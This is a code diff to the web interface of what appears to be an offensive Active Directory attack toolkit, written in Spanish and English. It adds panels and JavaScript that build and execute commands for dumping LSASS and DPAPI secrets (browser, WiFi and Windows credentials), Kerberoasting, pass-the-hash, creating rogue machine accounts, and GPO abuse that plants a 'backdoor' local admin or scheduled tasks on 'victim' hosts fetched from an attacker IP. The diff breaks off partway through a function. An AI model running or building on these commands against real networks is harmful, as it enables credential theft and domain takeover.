@@ -832,12 +832,15 @@ textarea.fi{resize:vertical;min-height:48px}
     <div class="s-item" onclick="sw('ad-kerb',this)"><div class="s-dot"></div><span class="s-icon">⚿</span>KERBEROS</div>
     <div class="s-item" onclick="sw('ad-exec',this)"><div class="s-dot"></div><span class="s-icon">▶</span>EXECUTION</div>
     <div class="s-item" onclick="sw('ad-creds',this)"><div class="s-dot"></div><span class="s-icon">⊕</span>CREDENTIALS</div>
+    <div class="s-item" onclick="sw('ad-dpapi',this)"><div class="s-dot"></div><span class="s-icon">⊕</span>DPAPI</div>
     <div class="s-item" onclick="sw('ad-map',this)"><div class="s-dot"></div><span class="s-icon">◉</span>BLOODHOUND</div>
     <div class="s-item" onclick="sw('ad-mitm',this)"><div class="s-dot"></div><span class="s-icon">⊗</span>MITM</div>
     <div class="s-item" onclick="sw('ad-acl',this)"><div class="s-dot"></div><span class="s-icon">⊗</span>ACL ABUSE</div>
     <div class="s-item" onclick="sw('ad-coerce',this)"><div class="s-dot"></div><span class="s-icon">⊘</span>COERCION</div>
     <div class="s-item" onclick="sw('ad-cert',this)"><div class="s-dot"></div><span class="s-icon">◈</span>ADCS</div>
     <div class="s-item" onclick="sw('ad-tickets',this)"><div class="s-dot"></div><span class="s-icon">⚿</span>TICKETS</div>
+    <div class="s-item" onclick="sw('ad-deleg',this)"><div class="s-dot"></div><span class="s-icon">⊘</span>DELEGATION</div>
+    <div class="s-item" onclick="sw('ad-gpo',this)"><div class="s-dot"></div><span class="s-icon">⊞</span>GPO ABUSE</div>
     <div class="s-item" onclick="sw('ad-winrm',this)"><div class="s-dot"></div><span class="s-icon">▶</span>EVIL-WINRM</div>
     <div class="s-item" onclick="sw('ad-postex',this)"><div class="s-dot"></div><span class="s-icon">≡</span>POST-EXPLOIT</div>
   </div>
@@ -1811,6 +1814,7 @@ textarea.fi{resize:vertical;min-height:48px}
         <option>ldapdomaindump</option><option>windapsearch</option><option>ldeep</option>
         <option>adidnsdump</option><option>enum4linux-ng</option>
         <option>rpcclient</option><option>smbclient</option><option>ldapsearch</option>
+        <option>lookupsid.py</option><option>samrdump.py</option>
       </select>
     </div>
   </div>
@@ -2073,20 +2077,31 @@ textarea.fi{resize:vertical;min-height:48px}
 
 <!-- ══ AD KERBEROS ══ -->
 <div id="p-ad-kerb" class="panel">
-  <div class="pt">KERBEROS <span class="ptd">— kerbrute, GetUserSPNs, GetNPUsers (Impacket)</span></div>
+  <div class="pt">KERBEROS <span class="ptd">— kerbrute, GetUserSPNs, GetNPUsers, targetedKerberoast</span></div>
+  <div class="t-bar" id="kerb-tbar"><div class="t-dot"></div><span class="t-name">verificando...</span></div>
   <div id="kb-val" class="val-msg"></div>
   <div class="row">
     <div class="ig w2"><div class="lbl">DC IP</div><input class="fi" id="kb-dc" placeholder="192.168.1.10" oninput="bKerb()"></div>
     <div class="ig"><div class="lbl">DOMINIO</div><input class="fi" id="kb-dom" placeholder="domain.local" oninput="bKerb()"></div>
     <div class="ig"><div class="lbl">TOOL</div>
-      <select class="fi" id="kb-t" onchange="bKerb()">
+      <select class="fi" id="kb-t" onchange="kerbToolChange()">
         <option>kerbrute</option><option>GetUserSPNs.py</option><option>GetNPUsers.py</option>
+        <option>targetedKerberoast</option>
       </select></div>
   </div>
   <div class="row">
     <div class="ig"><div class="lbl">USUARIO</div><input class="fi" id="kb-u" placeholder="user" oninput="bKerb()"></div>
-    <div class="ig"><div class="lbl">PASSWORD</div><input class="fi" id="kb-p" placeholder="Password1!" oninput="bKerb()"></div>
+    <div class="ig"><div class="lbl">PASSWORD / HASH (LM:NT)</div><input class="fi" id="kb-p" placeholder="Password1!" oninput="bKerb()"></div>
     <div class="ig w2"><div class="lbl">WORDLIST / USERS FILE</div><input class="fi" id="kb-wl" placeholder="/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt" oninput="bKerb()"></div>
+  </div>
+  <div class="row" id="kb-tkr-row" style="display:none">
+    <div class="ig"><div class="lbl">OUTPUT FILE</div><input class="fi" id="kb-tkr-out" placeholder="/tmp/tgs.txt" oninput="bKerb()"></div>
+    <div class="ig" style="max-width:200px"><div class="lbl">OPCIONES</div>
+      <div class="checks" id="kb-tkr-opts">
+        <div class="ck" data-v="--request-user">--request-user (un objetivo)</div>
+        <div class="ck" data-v="-v">-v verbose</div>
+      </div>
+    </div>
   </div>
   <div class="cmd-preview"><div class="cmd-lbl">COMANDO</div><div class="cmd-text" id="kb-cmd"></div></div>
   <div class="run-row">
@@ -2126,15 +2141,34 @@ textarea.fi{resize:vertical;min-height:48px}
 
 <!-- ══ AD CREDS ══ -->
 <div id="p-ad-creds" class="panel">
-  <div class="pt">CREDENTIALS DUMP <span class="ptd">— secretsdump.py</span></div>
+  <div class="pt">CREDENTIALS DUMP <span class="ptd">— secretsdump.py · lsassy</span></div>
+  <div class="t-bar" id="crd-tbar"><div class="t-dot"></div><span class="t-name">verificando lsassy...</span></div>
   <div id="cd-val" class="val-msg"></div>
   <div class="row">
     <div class="ig w2"><div class="lbl">TARGET</div><input class="fi" id="cd-h" placeholder="192.168.1.10" oninput="bCreds()"></div>
     <div class="ig"><div class="lbl">DOMINIO</div><input class="fi" id="cd-d" placeholder="domain.local" oninput="bCreds()"></div>
+    <div class="ig"><div class="lbl">TOOL</div>
+      <select class="fi" id="cd-t" onchange="cdToolChange()">
+        <option value="secretsdump">secretsdump.py</option>
+        <option value="lsassy">lsassy</option>
+      </select>
+    </div>
   </div>
   <div class="row">
     <div class="ig"><div class="lbl">USUARIO</div><input class="fi" id="cd-u" placeholder="Administrator" oninput="bCreds()"></div>
-    <div class="ig"><div class="lbl">PASSWORD / HASH</div><input class="fi" id="cd-p" placeholder="Password1!" oninput="bCreds()"></div>
+    <div class="ig"><div class="lbl">PASSWORD / HASH (LM:NT)</div><input class="fi" id="cd-p" placeholder="Password1!" oninput="bCreds()"></div>
+    <div class="ig" id="cd-lsassy-m-grp" style="display:none">
+      <div class="lbl">MÉTODO lsassy</div>
+      <select class="fi" id="cd-lsassy-m" onchange="bCreds()">
+        <option value="">auto</option>
+        <option value="wdigest">wdigest</option>
+        <option value="lsassdump">lsassdump</option>
+        <option value="nanodump">nanodump</option>
+        <option value="comsvcs">comsvcs</option>
+        <option value="taskmgr">taskmgr</option>
+        <option value="createdump">createdump</option>
+      </select>
+    </div>
   </div>
   <div class="cmd-preview"><div class="cmd-lbl">COMANDO</div><div class="cmd-text" id="cd-cmd"></div></div>
   <div class="run-row">
@@ -2143,6 +2177,53 @@ textarea.fi{resize:vertical;min-height:48px}
     <button class="kbtn" onclick="cpCmd('cd-cmd')">COPY</button>
   </div>
   <div class="out-area" id="cd-out"><div class="out-hdr"><span class="out-title">OUTPUT</span><button class="kbtn" onclick="clrOut('cd-out')">CLEAR</button></div><div class="out-content" id="cd-out-c"></div></div>
+</div>
+
+<!-- ══ AD DPAPI ══ -->
+<div id="p-ad-dpapi" class="panel">
+  <div class="pt">DPAPI <span class="ptd">— dploot: masterkeys, credentials, browser, wifi, certs</span></div>
+  <div class="t-bar" id="dpa-tbar"><div class="t-dot"></div><span class="t-name">verificando dploot...</span></div>
+  <div style="margin-bottom:8px;padding:6px 10px;background:#020605;border:1px solid #0d2312;border-radius:3px;font-size:11px;color:var(--mut)">
+    <span style="color:var(--g)">dploot</span> — Extrae secretos DPAPI remotamente sin agente: contraseñas de navegadores, WiFi, certificados, credenciales de Windows y más. Requiere admin local en el target.
+  </div>
+  <div class="row">
+    <div class="ig w2"><div class="lbl">TARGET (IP o hostname)</div><input class="fi" id="dpa-h" placeholder="192.168.1.10" oninput="bDpapi()"></div>
+    <div class="ig"><div class="lbl">DOMINIO</div><input class="fi" id="dpa-d" placeholder="domain.local" oninput="bDpapi()"></div>
+  </div>
+  <div class="row">
+    <div class="ig"><div class="lbl">USUARIO</div><input class="fi" id="dpa-u" placeholder="Administrator" oninput="bDpapi()"></div>
+    <div class="ig"><div class="lbl">PASSWORD / HASH (LM:NT)</div><input class="fi" id="dpa-p" placeholder="Password1!" oninput="bDpapi()"></div>
+    <div class="ig"><div class="lbl">OPERACIÓN</div>
+      <select class="fi" id="dpa-op" onchange="bDpapi()">
+        <option value="triage">triage — todo de una vez</option>
+        <option value="masterkeys">masterkeys — claves DPAPI usuario</option>
+        <option value="machinemasterkeys">machinemasterkeys — claves DPAPI máquina</option>
+        <option value="credentials">credentials — credenciales Windows</option>
+        <option value="vaults">vaults — Windows Vault</option>
+        <option value="browser">browser — contraseñas navegador</option>
+        <option value="wifi">wifi — contraseñas WiFi</option>
+        <option value="certificates">certificates — certificados usuario/máquina</option>
+        <option value="sccm">sccm — credenciales SCCM/ConfigMgr</option>
+        <option value="scheduled_tasks">scheduled_tasks — tareas programadas</option>
+      </select>
+    </div>
+  </div>
+  <div class="row">
+    <div class="ig"><div class="lbl">OUTPUT DIR (opt.)</div><input class="fi" id="dpa-out" placeholder="/tmp/dploot" oninput="bDpapi()"></div>
+    <div class="ig">
+      <div class="lbl">OPCIONES</div>
+      <div class="checks" id="dpa-opts">
+        <div class="ck" data-v="-debug">-debug</div>
+      </div>
+    </div>
+  </div>
+  <div class="cmd-preview"><div class="cmd-lbl">COMANDO</div><div class="cmd-text" id="dpa-cmd"></div></div>
+  <div class="run-row">
+    <button class="rbtn" id="dpa-run" onclick="runTool('dpa')">▶ EJECUTAR</button>
+    <button class="sbtn" id="dpa-stop" onclick="stopTool('dpa')" disabled>■ STOP</button>
+    <button class="kbtn" onclick="cpCmd('dpa-cmd')">COPY</button>
+  </div>
+  <div class="out-area" id="dpa-out-area"><div class="out-hdr"><span class="out-title">OUTPUT</span><button class="kbtn" onclick="clrOut('dpa-out-area')">CLEAR</button></div><div class="out-content" id="dpa-out-c"></div></div>
 </div>
 
 <!-- ══ BLOODHOUND ══ -->
@@ -2507,6 +2588,231 @@ textarea.fi{resize:vertical;min-height:48px}
     <button class="kbtn" onclick="tktSetKrb5()">SET KRB5</button>
   </div>
   <div class="out-area" id="tkt-out"><div class="out-hdr"><span class="out-title">OUTPUT</span><button class="kbtn" onclick="clrOut('tkt-out')">CLEAR</button></div><div class="out-content" id="tkt-out-c"></div></div>
+</div>
+
+<!-- ══ AD DELEGATION ══ -->
+<div id="p-ad-deleg" class="panel">
+  <div class="pt">DELEGATION <span class="ptd">— findDelegation.py · addcomputer.py (Impacket)</span></div>
+  <div class="tabs">
+    <div class="tab on" onclick="stab('dlg','find',this);bDelegation()">FIND DELEGATION</div>
+    <div class="tab" onclick="stab('dlg','addpc',this);bDelegation()">ADD COMPUTER</div>
+  </div>
+
+  <!-- FIND DELEGATION -->
+  <div id="dlg-find" class="tab-content on">
+    <div style="margin-bottom:8px;padding:7px 10px;background:#020605;border:1px solid #0d2312;border-radius:3px;font-size:12px;color:var(--mut);line-height:1.8">
+      <span style="color:var(--g);font-weight:600">findDelegation.py</span> — Enumera todos los objetos del dominio con delegación configurada: unconstrained, constrained (S4U) y RBCD.<br>
+      <span style="color:var(--txt)">Unconstrained:</span> la cuenta puede impersonar cualquier usuario · <span style="color:var(--txt)">Constrained:</span> solo a SPNs específicos · <span style="color:var(--txt)">RBCD:</span> configurado en el target
+    </div>
+    <div class="row">
+      <div class="ig w2"><div class="lbl">DC IP</div><input class="fi" id="dlg-f-dc" placeholder="192.168.1.10" oninput="bDelegation()"></div>
+      <div class="ig"><div class="lbl">DOMINIO</div><input class="fi" id="dlg-f-dom" placeholder="domain.local" oninput="bDelegation()"></div>
+    </div>
+    <div class="row">
+      <div class="ig"><div class="lbl">USUARIO</div><input class="fi" id="dlg-f-u" placeholder="user" oninput="bDelegation()"></div>
+      <div class="ig"><div class="lbl">PASSWORD / HASH (LM:NT)</div><input class="fi" id="dlg-f-p" placeholder="Password1!" oninput="bDelegation()"></div>
+    </div>
+  </div>
+
+  <!-- ADD COMPUTER -->
+  <div id="dlg-addpc" class="tab-content">
+    <div style="margin-bottom:8px;padding:7px 10px;background:#050401;border:1px solid #2a1a00;border-radius:3px;font-size:12px;color:var(--mut);line-height:1.8">
+      <span style="color:var(--yellow);font-weight:600">addcomputer.py</span> — Añade una cuenta de máquina al dominio. Pre-requisito clave para ataques RBCD: necesitas una cuenta máquina propia para escribir en <code style="color:var(--cyan);background:#010304;padding:1px 4px;border-radius:2px">msDS-AllowedToActOnBehalfOfOtherIdentity</code>.<br>
+      <span style="color:var(--txt)">Por defecto cualquier usuario autenticado puede crear hasta 10 máquinas</span> (MAQ = 10 en MachineAccountQuota).
+    </div>
+    <div class="row">
+      <div class="ig w2"><div class="lbl">DC IP</div><input class="fi" id="dlg-a-dc" placeholder="192.168.1.10" oninput="bDelegation()"></div>
+      <div class="ig"><div class="lbl">DOMINIO</div><input class="fi" id="dlg-a-dom" placeholder="domain.local" oninput="bDelegation()"></div>
+    </div>
+    <div class="row">
+      <div class="ig"><div class="lbl">USUARIO (tuyo)</div><input class="fi" id="dlg-a-u" placeholder="user" oninput="bDelegation()"></div>
+      <div class="ig"><div class="lbl">PASSWORD / HASH (LM:NT)</div><input class="fi" id="dlg-a-p" placeholder="Password1!" oninput="bDelegation()"></div>
+    </div>
+    <div class="row">
+      <div class="ig"><div class="lbl">NOMBRE MÁQUINA</div><input class="fi" id="dlg-a-cn" placeholder="EVILPC$" oninput="bDelegation()"></div>
+      <div class="ig"><div class="lbl">PASSWORD MÁQUINA</div><input class="fi" id="dlg-a-cp" placeholder="P@ssw0rd123!" oninput="bDelegation()"></div>
+      <div class="ig" style="max-width:120px"><div class="lbl">MÉTODO</div>
+        <select class="fi" id="dlg-a-method" onchange="bDelegation()">
+          <option value="LDAPS">LDAPS</option>
+          <option value="SAMR">SAMR</option>
+        </select>
+      </div>
+    </div>
+  </div>
+
+  <div class="cmd-preview"><div class="cmd-lbl">COMANDO</div><div class="cmd-text" id="dlg-cmd"></div></div>
+  <div class="run-row">
+    <button class="rbtn" id="dlg-run" onclick="runTool('dlg')">▶ EJECUTAR</button>
+    <button class="sbtn" id="dlg-stop" onclick="stopTool('dlg')" disabled>■ STOP</button>
+    <button class="kbtn" onclick="cpCmd('dlg-cmd')">COPY</button>
+  </div>
+  <div class="out-area" id="dlg-out"><div class="out-hdr"><span class="out-title">OUTPUT</span><button class="kbtn" onclick="clrOut('dlg-out')">CLEAR</button></div><div class="out-content" id="dlg-out-c"></div></div>
+</div>
+
+<!-- ══ AD GPO ABUSE ══ -->
+<div id="p-ad-gpo" class="panel">
+  <div class="pt">GPO ABUSE <span class="ptd">— bloodyAD · dacledit · ldapsearch · SharpGPOAbuse · Grouper2 · PowerView</span></div>
+  <div class="t-bar" id="gpo-tbar"><div class="t-dot"></div><span class="t-name">verificando bloodyAD...</span></div>
+
+  <div class="row">
+    <div class="ig w2"><div class="lbl">DC IP</div><input class="fi" id="gp-dc" placeholder="192.168.1.10" oninput="bGpo()"></div>
+    <div class="ig"><div class="lbl">DOMINIO</div><input class="fi" id="gp-dom" placeholder="domain.local" oninput="bGpo()"></div>
+  </div>
+  <div class="row">
+    <div class="ig"><div class="lbl">USUARIO</div><input class="fi" id="gp-u" placeholder="user" oninput="bGpo()"></div>
+    <div class="ig w2"><div class="lbl">PASSWORD / HASH (LM:NT)</div><input class="fi" id="gp-p" placeholder="Password1!" oninput="bGpo()"></div>
+  </div>
+
+  <div id="gpo-chain-alert" style="display:none;background:#0a1f0a;border:1px solid #1a4f1a;border-radius:4px;padding:8px 12px;margin-bottom:8px;font-size:11px;color:#4ecf4e">
+    ⚠ GPO abuse path detected — writable GPO linked to workstations found. Proceed to the ABUSE tab.
+    <div id="gpo-chain-detail" style="color:var(--mut);margin-top:3px;font-size:10px"></div>
+  </div>
+
+  <div class="tabs">
+    <div class="tab on" data-tab="enum" onclick="stab('gpo','enum',this);bGpo()">ENUM GPO</div>
+    <div class="tab" data-tab="find" onclick="stab('gpo','find',this);bGpo()">FIND ABUSE</div>
+    <div class="tab" data-tab="machines" onclick="stab('gpo','machines',this);bGpo()">FIND MACHINES</div>
+    <div class="tab" data-tab="abuse" onclick="stab('gpo','abuse',this);bGpo()">ABUSE</div>
+    <div class="tab" data-tab="wintools" onclick="stab('gpo','wintools',this);bGpo()">WIN TOOLS</div>
+  </div>
+
+  <!-- ENUM GPO -->
+  <div id="gpo-enum" class="tab-content on">
+    <div class="row">
+      <div class="ig w2"><div class="lbl">HERRAMIENTA</div>
+        <select class="fi" id="gp-enum-t" onchange="gpoEnumToolChange()">
+          <option value="bloodyad">bloodyAD — writable GPOs</option>
+          <option value="ldapsearch">ldapsearch — all GPOs (GUID, displayName, gPCFileSysPath)</option>
+          <option value="dacledit">dacledit.py — ACL of specific GPO</option>
+        </select>
+      </div>
+    </div>
+    <div class="row" id="gp-enum-guid-row" style="display:none">
+      <div class="ig w2"><div class="lbl">GPO GUID</div><input class="fi" id="gp-enum-guid" placeholder="{31B2F340-016D-11D2-945F-00C04FB984F9}" oninput="bGpo()"></div>
+    </div>
+  </div>
+
+  <!-- FIND ABUSE -->
+  <div id="gpo-find" class="tab-content">
+    <div class="row">
+      <div class="ig w2"><div class="lbl">HERRAMIENTA</div>
+        <select class="fi" id="gp-find-t" onchange="gpoFindToolChange()">
+          <option value="bloodyad">bloodyAD — get writable --otype GPO</option>
+          <option value="dacledit">dacledit.py — read ACL on specific GPO</option>
+        </select>
+      </div>
+    </div>
+    <div class="row" id="gp-find-guid-row" style="display:none">
+      <div class="ig w2"><div class="lbl">GPO GUID (target)</div><input class="fi" id="gp-find-guid" placeholder="{31B2F340-016D-11D2-945F-00C04FB984F9}" oninput="bGpo()"></div>
+    </div>
+    <div style="background:#050d10;border:1px solid #0a2030;border-radius:4px;padding:7px 10px;margin-top:6px;font-size:10px;color:var(--mut)">
+      Detecta: WRITE · WRITE_DACL · WRITE_OWNER · GenericAll · GenericWrite sobre GPOs.<br>
+      Si encuentras GPOs escribibles, copia el GUID y úsalo en FIND MACHINES para ver equipos afectados → luego ABUSE.
+    </div>
+  </div>
+
+  <!-- FIND MACHINES -->
+  <div id="gpo-machines" class="tab-content">
+    <div class="row">
+      <div class="ig"><div class="lbl">OPERACIÓN</div>
+        <select class="fi" id="gp-machines-op" onchange="gpoMachinesOpChange()">
+          <option value="gpoinfo">1. GPO info — GUID → displayName + gPCFileSysPath</option>
+          <option value="linkedous">2. OUs vinculadas — gPLink contiene GUID</option>
+          <option value="computers">3. Computers en OU — hostname, OS, lastLogon</option>
+        </select>
+      </div>
+      <div class="ig w2"><div class="lbl">GPO GUID</div><input class="fi" id="gp-machines-guid" placeholder="{31B2F340-016D-11D2-945F-00C04FB984F9}" oninput="bGpo()"></div>
+    </div>
+    <div class="row" id="gp-machines-ou-row" style="display:none">
+      <div class="ig w2"><div class="lbl">OU base (para búsqueda de computers)</div><input class="fi" id="gp-machines-ou" placeholder="OU=Workstations,DC=domain,DC=local" oninput="bGpo()"></div>
+    </div>
+    <div style="background:#050a0f;border:1px solid #0a1f30;border-radius:4px;padding:6px 10px;margin-top:5px;font-size:10px;color:var(--mut)">
+      Risk scoring: <span style="color:#cf5050">DC / SQL / WEB / APP / FILE</span> en nombre → HIGH &nbsp;·&nbsp; <span style="color:#cf9f30">Workstation / WS / PC</span> → MED &nbsp;·&nbsp; otros → LOW
+    </div>
+  </div>
+
+  <!-- ABUSE -->
+  <div id="gpo-abuse" class="tab-content">
+    <div class="sdiv">SharpGPOAbuse — Windows delivery via HTTP server</div>
+    <div class="row">
+      <div class="ig w2"><div class="lbl">GPO NAME</div><input class="fi" id="gp-gpo-name" placeholder="Default Domain Policy" oninput="bGpo()"></div>
+      <div class="ig"><div class="lbl">PRESET</div>
+        <select class="fi" id="gp-abuse-preset" onchange="bGpo()">
+          <option value="AddLocalAdmin">Add Local Admin</option>
+          <option value="ImmediateTask">Immediate Scheduled Task</option>
+          <option value="ScheduledTask">Scheduled Task (next reboot)</option>
+          <option value="StartupScript">Startup Script (next reboot)</option>
+          <option value="ShutdownScript">Shutdown Script</option>
+          <option value="LogonScript">Logon Script (user)</option>
+          <option value="Cleanup">Cleanup / Rollback</option>
+        </select>
+      </div>
+    </div>
+    <div class="row">
+      <div class="ig w2"><div class="lbl">TARGET USER (Add Local Admin / Tasks)</div><input class="fi" id="gp-abuse-target" placeholder="backdoor" oninput="bGpo()"></div>
+      <div class="ig"><div class="lbl">EXTRA ARGS (opcional)</div><input class="fi" id="gp-abuse-extra" placeholder="" oninput="bGpo()"></div>
+    </div>
+    <div class="row">
+      <div class="ig"><div class="lbl">ATTACKER IP</div><input class="fi" id="gp-abuse-ip" placeholder="192.168.1.99" oninput="bGpo()"></div>
+      <div class="ig" style="max-width:78px"><div class="lbl">PUERTO HTTP</div><input class="fi" id="gp-abuse-port" value="8888" oninput="bGpo()"></div>
+      <div class="ig w2"><div class="lbl">DIR LOCAL (SharpGPOAbuse)</div><input class="fi" id="gp-abuse-dir" value="/opt/SharpGPOAbuse" oninput="bGpo()"></div>
+    </div>
+    <div id="gpo-impact-abuse" style="background:#050510;border:1px solid #1a1a30;border-radius:4px;padding:6px 10px;margin-top:5px;font-size:10px">
+      <span style="color:#7080cf">IMPACTO:</span> <span id="gpo-impact-abuse-txt" style="color:var(--mut)">selecciona preset</span>
+    </div>
+    <div class="sdiv" style="margin-top:8px">DELIVERY — ejecutar en víctima (Windows)</div>
+    <div id="gpo-abuse-plist" class="plist"></div>
+  </div>
+
+  <!-- WIN TOOLS -->
+  <div id="gpo-wintools" class="tab-content">
+    <div class="sdiv">Windows tools — delivery via HTTP server</div>
+    <div class="row">
+      <div class="ig"><div class="lbl">HERRAMIENTA</div>
+        <select class="fi" id="gp-win-t" onchange="gpoWinToolChange()">
+          <option value="grouper2">Grouper2</option>
+          <option value="powerview">PowerView (GPO cmds)</option>
+        </select>
+      </div>
+      <div class="ig"><div class="lbl">ATTACKER IP</div><input class="fi" id="gp-win-ip" placeholder="192.168.1.99" oninput="bGpo()"></div>
+      <div class="ig" style="max-width:78px"><div class="lbl">PUERTO HTTP</div><input class="fi" id="gp-win-port" value="8888" oninput="bGpo()"></div>
+    </div>
+    <div class="row" id="gp-win-g2-row">
+      <div class="ig"><div class="lbl">MODO (Grouper2)</div>
+        <select class="fi" id="gp-win-g2-mode" onchange="bGpo()">
+          <option value="basic">Invoke-Grouper2 (básico)</option>
+          <option value="full">Invoke-Grouper2 -FullReport</option>
+          <option value="sysvol">Invoke-Grouper2 -Path \\domain\SYSVOL</option>
+          <option value="interesting">Invoke-Grouper2 -FindInteresting</option>
+        </select>
+      </div>
+      <div class="ig w2"><div class="lbl">DIR LOCAL (Grouper2)</div><input class="fi" id="gp-win-g2-dir" value="/opt/Grouper2" oninput="bGpo()"></div>
+    </div>
+    <div id="gp-win-pv-row" style="display:none">
+      <div class="row">
+        <div class="ig"><div class="lbl">COMANDO (PowerView)</div>
+          <select class="fi" id="gp-win-pv-cmd" onchange="bGpo()">
+            <option value="Get-GPO -All">Get-GPO -All</option>
+            <option value="Get-DomainGPO">Get-DomainGPO</option>
+            <option value="Get-DomainGPOLocalGroup">Get-DomainGPOLocalGroup</option>
+            <option value="Get-DomainGPOUserLocalGroupMapping">Get-DomainGPOUserLocalGroupMapping</option>
+            <option value="Get-DomainOU | % { Get-DomainGPO -Identity $_.gplink }">Get-DomainOU → GPO mapping</option>
+          </select>
+        </div>
+        <div class="ig w2"><div class="lbl">DIR LOCAL (PowerView)</div><input class="fi" id="gp-win-pv-dir" value="/opt/PowerView" oninput="bGpo()"></div>
+      </div>
+    </div>
+    <div class="sdiv" style="margin-top:8px">DELIVERY — ejecutar en víctima (Windows)</div>
+    <div id="gpo-win-plist" class="plist"></div>
+  </div>
+
+  <div class="cmd-preview"><div class="cmd-lbl">COMANDO</div><div class="cmd-text" id="gpo-cmd"></div></div>
+  <div class="run-row">
+    <button class="rbtn" id="gpo-run" onclick="runTool('gpo')">▶ EJECUTAR</button>
+    <button class="sbtn" id="gpo-stop" onclick="stopTool('gpo')" disabled>■ STOP</button>
+    <button class="kbtn" onclick="cpCmd('gpo-cmd')">COPY</button>
+  </div>
+  <div class="out-area" id="gpo-out"><div class="out-hdr"><span class="out-title">OUTPUT</span><button class="kbtn" onclick="clrOut('gpo-out')">CLEAR</button></div><div class="out-content" id="gpo-out-c"></div></div>
 </div>
 
 <!-- ══ EVIL-WINRM ══ -->
@@ -8549,6 +8855,11 @@ const _AE_ACTIONS = {
     { v:'srvinfo',       l:'Información del servidor' },
     { v:'getdompwinfo',  l:'Política de contraseñas' },
   ],
+  'lookupsid.py': [
+    { v:'500',  l:'500 — rango estándar (usuarios + grupos)' },
+    { v:'1000', l:'1000 — rango extendido' },
+    { v:'3000', l:'3000 — rango amplio' },
+  ],
 };
 
 const _AE_HINTS = {
@@ -8569,6 +8880,14 @@ const _AE_HINTS = {
     html:  '⚠ Requiere <b>ldap3</b> en el venv — si aparece <i>No module named \'ldap\'</i>: ' +
            '<button class="kbtn" style="padding:2px 8px;font-size:11px;margin-left:6px" ' +
            'onclick="execDirect(\'/opt/404x9-evil-kit/venv/bin/pip install ldap3 gssapi\')">⬇ pip install ldap3</button>',
+  },
+  'lookupsid.py': {
+    style: 'border:1px solid #0d2010;background:#020704;color:var(--mut)',
+    html:  '<span style="color:var(--g)">lookupsid.py</span> — Fuerza bruta de RIDs vía MS-LSAT para enumerar usuarios y grupos. Útil en entornos con NULL session o con credenciales válidas. El selector de <b>ACCIÓN</b> controla el maxRid.',
+  },
+  'samrdump.py': {
+    style: 'border:1px solid #0d2010;background:#020704;color:var(--mut)',
+    html:  '<span style="color:var(--g)">samrdump.py</span> — Enumera usuarios, grupos y políticas vía SAMR (puerto 445). Equivalente remoto de <code style="color:var(--cyan)">net user /domain</code>.',
   },
 };
 
@@ -8663,6 +8982,23 @@ function bAdEnum() {
     c = `<span class="b">ldapsearch</span>`+
         ` <span class="f">-x -H ldap://${dc} -D "${u}@${dom}" -w '${p}' -b "${base}"</span>`;
 
+  } else if (t === 'lookupsid.py') {
+    const maxRid = act || '500';
+    const isHash = p.includes(':');
+    const path = '/usr/share/doc/python3-impacket/examples/lookupsid.py';
+    if (isHash) {
+      c = `<span class="b">python3 ${path}</span> <span class="v">${dom}/${u}@${dc}</span> <span class="f">-hashes ${p}</span> <span class="v">${maxRid}</span>`;
+    } else {
+      c = `<span class="b">python3 ${path}</span> <span class="v">${dom}/${u}:'${p}'@${dc}</span> <span class="v">${maxRid}</span>`;
+    }
+  } else if (t === 'samrdump.py') {
+    const isHash = p.includes(':');
+    const path = '/usr/share/doc/python3-impacket/examples/samrdump.py';
+    if (isHash) {
+      c = `<span class="b">python3 ${path}</span> <span class="v">${dom}/${u}@${dc}</span> <span class="f">-hashes ${p}</span>`;
+    } else {
+      c = `<span class="b">python3 ${path}</span> <span class="v">${dom}/${u}:'${p}'@${dc}</span>`;
+    }
   } else { // ldapdomaindump
     c = `<span class="b">mkdir -p /tmp/ldapdump &amp;&amp; ldapdomaindump</span>`+
         ` <span class="f">-u '${dom}\\${u}' -p '${p}' -o /tmp/ldapdump</span>`+
@@ -9125,16 +9461,32 @@ function nxcAttachLiveStream(jobId) {
 }
 
 onDoneHooks.sm = function(){ nxcParseNow(); };
+function kerbToolChange() {
+  const t = gv('kb-t');
+  const row = document.getElementById('kb-tkr-row');
+  if (row) row.style.display = t === 'targetedKerberoast' ? '' : 'none';
+  bKerb();
+}
 async function bKerb() {
   const dc=gv('kb-dc')||'192.168.1.10', dom=gv('kb-dom')||'domain.local';
   const u=gv('kb-u')||'user', p=gv('kb-p')||'Password1!', wl=gv('kb-wl')||'users.txt', t=gv('kb-t');
+  const isHash = p.includes(':');
   let c='';
   if(t==='GetUserSPNs.py') {
     const path = (await resolveImpacket('GetUserSPNs.py')) || 'GetUserSPNs.py';
-    c=`<span class="b">python3 ${path}</span> <span class="v">${dom}/${u}:'${p}'</span> <span class="f">-dc-ip</span> <span class="v">${dc}</span> <span class="f">-request -outputfile /tmp/tgs.txt</span>`;
+    const creds = isHash ? `${dom}/${u}@${dc} -hashes ${p}` : `${dom}/${u}:'${p}'`;
+    c=`<span class="b">python3 ${path}</span> <span class="v">${creds}</span> <span class="f">-dc-ip</span> <span class="v">${dc}</span> <span class="f">-request -outputfile /tmp/tgs.txt</span>`;
   } else if(t==='GetNPUsers.py') {
     const path = (await resolveImpacket('GetNPUsers.py')) || 'GetNPUsers.py';
     c=`<span class="b">python3 ${path}</span> <span class="v">${dom}/</span> <span class="f">-usersfile</span> <span class="v">${wl}</span> <span class="f">-dc-ip</span> <span class="v">${dc}</span> <span class="f">-no-pass -outputfile /tmp/asrep.txt</span>`;
+  } else if(t==='targetedKerberoast') {
+    const out=gv('kb-tkr-out')||'/tmp/tgs.txt', opts=chks('kb-tkr-opts');
+    if(isHash) {
+      c=`<span class="b">targetedKerberoast</span> <span class="f">-v -u</span> <span class="v">${u}</span> <span class="f">-H</span> <span class="v">${p}</span> <span class="f">-d</span> <span class="v">${dom}</span> <span class="f">--dc-ip</span> <span class="v">${dc}</span> <span class="f">-o</span> <span class="v">${out}</span>`;
+    } else {
+      c=`<span class="b">targetedKerberoast</span> <span class="f">-v -u</span> <span class="v">${u}</span> <span class="f">-p '${p}' -d</span> <span class="v">${dom}</span> <span class="f">--dc-ip</span> <span class="v">${dc}</span> <span class="f">-o</span> <span class="v">${out}</span>`;
+    }
+    if(opts) c+=` <span class="f">${opts}</span>`;
   } else {
     c=`<span class="b">kerbrute</span> <span class="f">userenum --dc</span> <span class="v">${dc}</span> <span class="f">-d</span> <span class="v">${dom}</span> <span class="v">${wl}</span>`;
   }
@@ -9151,14 +9503,33 @@ async function bExec() {
   if(cmd) c+=` <span class="v">"${cmd}"</span>`;
   setH('ex-cmd', c);
 }
+function cdToolChange() {
+  const t = gv('cd-t');
